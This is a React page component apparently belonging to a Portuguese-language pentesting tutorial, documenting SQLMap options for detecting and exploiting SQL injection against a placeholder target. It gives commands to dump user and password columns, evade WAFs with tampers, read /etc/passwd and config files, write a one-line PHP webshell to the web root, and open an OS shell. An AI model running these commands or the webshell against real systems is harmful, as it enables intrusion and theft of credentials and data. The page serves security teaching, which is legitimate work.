import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { ParamsTable } from "@/components/ui/ParamsTable";

export default function Sqlmap() {
  return (
    <PageContainer
      title="SQLMap"
      subtitle="Automação de detecção e exploração de injeção SQL em aplicações web."
      difficulty="intermediario"
      timeToRead="12 min"
    >
      <AlertBox type="danger" title="Uso exclusivo em sistemas autorizados">
        O SQLMap é uma ferramenta de exploração ativa. Nunca use em sistemas sem autorização por escrito.
      </AlertBox>

      <h2>Consultando a ajuda do SQLMap</h2>
      <CodeBlock language="bash" code={`# Ajuda básica
sqlmap --help
sqlmap -h

# Ajuda completa (muito detalhada)
sqlmap --hh

# O --help do SQLMap agrupa as opções por categoria:
# Target:     onde atacar (URL, request, etc.)
# Request:    como fazer as requisições HTTP
# Optimization: velocidade e eficiência
# Injection:  técnicas de injeção
# Detection:  configurações de detecção
# Techniques: quais técnicas SQLi usar
# Enumeration: o que extrair do banco
# Operating system access: acesso ao SO
# File system: leitura/escrita de arquivos`} />

      <AlertBox type="info" title="Como ler o --help do SQLMap">
        O SQLMap usa <code>--duplo-traço</code> para todas as opções longas (exceto <code>-u</code>, <code>-p</code>, etc.). 
        Opções que recebem valores são escritas como <code>--opção=VALOR</code> ou <code>--opção VALOR</code>. 
        As categorias abaixo explicam cada uma em português.
      </AlertBox>

      <h2>Básico do SQLMap</h2>
      <CodeBlock language="bash" code={`# Testar URL com parâmetro GET
sqlmap -u "http://alvo.com/page?id=1"

# POST request
sqlmap -u "http://alvo.com/login" --data="user=admin&pass=123"

# Usando arquivo de request (exportado do Burp Suite — o mais prático!)
sqlmap -r request.txt

# Com cookie de sessão autenticado
sqlmap -u "http://alvo.com/profile?id=1" --cookie="session=abc123"

# Especificar parâmetro vulnerável (quando há vários)
sqlmap -u "http://alvo.com/?id=1&name=test" -p id`} />

      <ParamsTable
        title="Target — como especificar o alvo"
        params={[
          { flag: "-u URL", desc: "URL alvo com o parâmetro a testar. Coloque * onde quiser injetar se não for detectado automaticamente.", exemplo: "sqlmap -u 'http://alvo.com/page?id=1'" },
          { flag: "-r ARQUIVO", desc: "Lê uma requisição HTTP completa de um arquivo (exportado do Burp Suite). A forma mais prática e precisa!", exemplo: "sqlmap -r request.txt" },
          { flag: "--data DADOS", desc: "Dados do corpo da requisição POST. Equivale ao body de um formulário.", exemplo: "--data 'user=admin&pass=x'" },
          { flag: "--cookie COOKIE", desc: "Envia um cookie HTTP com cada requisição. Necessário para acessar áreas autenticadas.", exemplo: "--cookie 'PHPSESSID=abc123'" },
          { flag: "-p PARÂMETRO", desc: "Força o teste em um parâmetro específico quando há múltiplos. Evita falsos positivos.", exemplo: "-p id" },
          { flag: "--method MÉTODO", desc: "Método HTTP a usar: GET (padrão), POST, PUT, etc.", exemplo: "--method PUT" },
          { flag: "-H 'HEADER'", desc: "Adiciona um header HTTP customizado a cada requisição.", exemplo: "-H 'X-Custom: valor'" },
          { flag: "--headers 'HEADER'", desc: "Múltiplos headers separados por \\n.", exemplo: "--headers 'X-A: 1\\nX-B: 2'" },
        ]}
      />

      <h2>Enumeração do banco</h2>
      <CodeBlock language="bash" code={`# Listar bancos de dados disponíveis
sqlmap -u "http://alvo.com/?id=1" --dbs

# Listar tabelas de um banco
sqlmap -u "http://alvo.com/?id=1" -D nome_banco --tables

# Listar colunas de uma tabela
sqlmap -u "http://alvo.com/?id=1" -D nome_banco -T usuarios --columns

# Dumpar tabela específica
sqlmap -u "http://alvo.com/?id=1" -D nome_banco -T usuarios --dump

# Dumpar apenas certas colunas
sqlmap -u "http://alvo.com/?id=1" -D nome_banco -T usuarios -C "login,senha" --dump`} />

      <ParamsTable
        title="Enumeration — extraindo dados do banco"
        params={[
          { flag: "--dbs", desc: "Lista todos os bancos de dados acessíveis no servidor. Primeiro passo após confirmar a injeção.", exemplo: "sqlmap -u 'url?id=1' --dbs" },
          { flag: "--current-db", desc: "Mostra qual banco de dados está sendo usado pela aplicação.", exemplo: "sqlmap -u 'url?id=1' --current-db" },
          { flag: "--current-user", desc: "Mostra o usuário do banco de dados com que a aplicação se conecta.", exemplo: "sqlmap -u 'url?id=1' --current-user" },
          { flag: "--is-dba", desc: "Verifica se o usuário atual tem privilégios de DBA (Database Administrator). DBA = pode fazer quase tudo!", exemplo: "sqlmap -u 'url?id=1' --is-dba" },
          { flag: "-D BANCO", desc: "Seleciona o banco de dados alvo para as próximas operações.", exemplo: "-D wordpress" },
          { flag: "--tables", desc: "Lista todas as tabelas do banco especificado com -D.", exemplo: "sqlmap -u 'url' -D wordpress --tables" },
          { flag: "-T TABELA", desc: "Seleciona a tabela alvo.", exemplo: "-T wp_users" },
          { flag: "--columns", desc: "Lista as colunas da tabela especificada com -T.", exemplo: "sqlmap -u 'url' -D wp -T wp_users --columns" },
          { flag: "-C COLUNAS", desc: "Seleciona colunas específicas (separe com vírgula).", exemplo: "-C 'user_login,user_pass'" },
          { flag: "--dump", desc: "Faz o dump (extrai) os dados da tabela/banco selecionado.", exemplo: "sqlmap -u 'url' -D wp -T wp_users -C user_pass --dump" },
          { flag: "--dump-all", desc: "Dumpa TODOS os bancos de dados. Use com cuidado — pode ser enorme!", exemplo: "sqlmap -u 'url' --dump-all" },
          { flag: "--users", desc: "Lista todos os usuários do banco de dados (requer privilégios).", exemplo: "sqlmap -u 'url' --users" },
          { flag: "--passwords", desc: "Tenta extrair os hashes de senhas dos usuários do banco.", exemplo: "sqlmap -u 'url' --passwords" },
        ]}
      />

      <h2>Técnicas e evasão de WAF</h2>
      <CodeBlock language="bash" code={`# Especificar técnicas de injeção
sqlmap -u "http://alvo.com/?id=1" --technique=BEUSTQ

# Evasão de WAF com tampers
sqlmap -u "http://alvo.com/?id=1" --tamper=space2comment
sqlmap -u "http://alvo.com/?id=1" --tamper=between,randomcase

# Listar todos os tampers disponíveis
ls /usr/share/sqlmap/tamper/`} />

      <ParamsTable
        title="--technique — técnicas de injeção SQL explicadas"
        params={[
          { flag: "B (Boolean-based blind)", desc: "Extrai dados bit a bit fazendo perguntas verdadeiro/falso. Lento mas funciona quando não há saída visível.", exemplo: "--technique=B" },
          { flag: "E (Error-based)", desc: "Usa mensagens de erro do banco para extrair dados. Rápido quando o banco exibe erros.", exemplo: "--technique=E" },
          { flag: "U (UNION-based)", desc: "Usa UNION SELECT para juntar dados maliciosos ao resultado legítimo. Mais rápido mas requer que a saída apareça na página.", exemplo: "--technique=U" },
          { flag: "S (Stacked queries)", desc: "Injeta múltiplos comandos SQL separados por ';'. Mais perigoso — pode modificar o banco.", exemplo: "--technique=S" },
          { flag: "T (Time-based blind)", desc: "Usa atrasos na resposta (SLEEP, WAITFOR DELAY) para extrair dados. Muito lento mas funciona mesmo sem nenhuma saída.", exemplo: "--technique=T" },
          { flag: "Q (Inline queries)", desc: "Usa subqueries inline. Funciona em cenários específicos.", exemplo: "--technique=Q" },
        ]}
      />

      <ParamsTable
        title="Tampers mais usados — evasão de WAF/filtros"
        params={[
          { flag: "space2comment", desc: "Substitui espaços por comentários SQL (/**/) para bypassar filtros de espaço.", exemplo: "--tamper=space2comment" },
          { flag: "between", desc: "Substitui > e < por BETWEEN...AND, evitando filtros de operadores de comparação.", exemplo: "--tamper=between" },
          { flag: "randomcase", desc: "Aleatória maiúsculas/minúsculas no SQL (SeLeCt, WHeRe). Bypassar filtros case-sensitive.", exemplo: "--tamper=randomcase" },
          { flag: "charencode", desc: "Codifica caracteres da URL (%2F, %27, etc.).", exemplo: "--tamper=charencode" },
          { flag: "base64encode", desc: "Codifica o payload em Base64.", exemplo: "--tamper=base64encode" },
          { flag: "equaltolike", desc: "Substitui = por LIKE. Útil quando = é filtrado.", exemplo: "--tamper=equaltolike" },
          { flag: "space2plus", desc: "Substitui espaços por + na URL.", exemplo: "--tamper=space2plus" },
          { flag: "modsecurityversioned", desc: "Comenta versões do MySQL para bypassar ModSecurity.", exemplo: "--tamper=modsecurityversioned" },
        ]}
      />

      <ParamsTable
        title="Flags de controle e performance"
        params={[
          { flag: "--level=N", desc: "Nível de testes (1-5). Padrão é 1. Nível mais alto = mais parâmetros testados (headers, cookies). Nível 5 testa tudo.", exemplo: "--level=5" },
          { flag: "--risk=N", desc: "Nível de risco (1-3). Padrão é 1. Risco 3 inclui queries que podem modificar dados — use com cuidado!", exemplo: "--risk=3" },
          { flag: "--threads=N", desc: "Número de threads paralelas. Padrão é 1. Aumente para extrações mais rápidas.", exemplo: "--threads=10" },
          { flag: "--delay=N", desc: "Espera N segundos entre cada requisição. Ajuda a evitar rate limiting.", exemplo: "--delay=2" },
          { flag: "--timeout=N", desc: "Timeout de cada requisição em segundos.", exemplo: "--timeout=30" },
          { flag: "--dbms=TIPO", desc: "Especifica o SGBD (evita testes desnecessários). Ex: mysql, postgresql, mssql, oracle, sqlite.", exemplo: "--dbms=mysql" },
          { flag: "--batch", desc: "Modo não interativo — responde automaticamente SIM para todas as perguntas. Bom para scripts.", exemplo: "--batch" },
          { flag: "-v N", desc: "Nível de verbosidade (0-6). 3 mostra os payloads injetados. 6 = debug completo.", exemplo: "-v 3" },
          { flag: "-s ARQUIVO", desc: "Salva e retoma a sessão em um arquivo SQLite.", exemplo: "-s sessao.db" },
        ]}
      />

      <h2>Leitura/escrita de arquivos e shell</h2>
      <CodeBlock language="bash" code={`# Ler arquivo do servidor (requer privilégio FILE do MySQL)
sqlmap -u "http://alvo.com/?id=1" --file-read="/etc/passwd"
sqlmap -u "http://alvo.com/?id=1" --file-read="/var/www/html/config.php"

# Escrever arquivo no servidor (plantar webshell!)
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "http://alvo.com/?id=1" \
  --file-write="shell.php" \
  --file-dest="/var/www/html/shell.php"

# Shell interativo (quando possível)
sqlmap -u "http://alvo.com/?id=1" --os-shell   # shell do OS
sqlmap -u "http://alvo.com/?id=1" --sql-shell   # shell SQL`} />
    </PageContainer>
  );
}
